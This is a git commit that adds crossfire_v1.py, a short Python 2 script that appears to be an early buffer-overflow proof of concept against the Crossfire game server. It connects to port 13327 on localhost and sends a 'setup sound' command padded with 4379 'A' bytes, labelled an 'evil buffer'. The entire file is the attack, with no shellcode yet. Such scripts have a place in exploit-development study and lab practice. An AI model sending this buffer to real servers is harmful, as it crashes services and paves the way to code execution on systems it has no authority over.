bec26f1be9f73be44228dcfb199789650fd75f27
Atrilka <atrilka@gmail.com>
2017-02-08 02:58:17 +0300

    Create crossfire_v1.py

---
+++ crossfire_v1.py
@@ -0,0 +1,16 @@
+#!/usr/bin/python 
+import socket
+
+host = "127.0.0.1" 
+crash="\x41" * 4379
+
+buffer = "\x11(setup sound " + crash + "\x90\x00#"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+print "[*]Sending evil buffer..."
+s.connect((host, 13327))
+data=s.recv(1024) 
+print data 
+s.send(buffer) 
+s.close()
+print "[*]Payload Sent !"
